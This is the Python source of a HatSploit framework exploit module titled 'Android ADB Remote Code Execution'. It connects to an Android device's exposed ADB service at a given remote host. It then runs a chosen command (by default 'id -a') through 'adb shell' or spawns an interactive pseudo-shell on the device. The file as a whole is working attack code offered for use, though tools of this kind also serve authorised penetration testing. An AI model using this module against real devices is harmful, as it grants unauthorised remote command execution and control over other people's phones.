#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.module import HatSploitModule

from utils.adb.adb import adb
from utils.shell.pseudo_shell import pseudo_shell

class HatSploitModule(HatSploitModule):
    adb = adb()
    pseudo_shell = pseudo_shell()

    details = {
        'Name': "Android ADB Remote Code Execution",
        'Module': "exploit/android/adb/remote_code_execution",
        'Authors': [
            'enty8080'
        ],
        'Description': "Remote Code Execution in Android ADB.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Risk': "medium"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'COMMAND': {
            'Description': "Command to execute.",
            'Value': "id -a",
            'Type': None,
            'Required': True
        },
        'PSEUDO': {
            'Description': "Spawn Pseudo shell.",
            'Value': "no",
            'Type': "boolean",
            'Required': False
        }
    }

    def clean_up(self):
        self.badges.output_process("Stopping ADB server...")

        if not self.adb.stop_adb_server():
            self.badges.output_error("Failed to stop ADB server!")

    def execute_command(self, command):
        self.badges.output_process("Attempting to execute command...")
        command_output = self.adb.execute_adb_command("shell", command)

        return (True, command_output)

    def start_server(self):
        self.badges.output_process("Starting ADB server...")

        if not self.adb.start_adb_server():
            self.badges.output_error("Failed to start ADB server!")
            return

    def run(self):
        remote_host, command, pseudo = self.parser.parse_options(self.options)

        self.badges.output_process("Checking ADB installation...")
        if not self.adb.check_adb_installation():
            self.badges.output_error("ADB is not installed!")
            return

        self.start_server()
        self.badges.output_process("Exploiting " + remote_host + "...")

        if not self.adb.connect(remote_host):
            self.badges.output_error("Exploit failed!")
            self.clean_up()
            return

        if not self.adb.check_connected(remote_host):
            self.badges.output_error("Exploit failed!")
            self.clean_up()
            return

        if pseudo in ['yes', 'y']:
            self.pseudo_shell.spawn_pseudo_shell(self.details['Module'], self.execute_command)
        else:
            self.execute_command(command)

        self.clean_up()
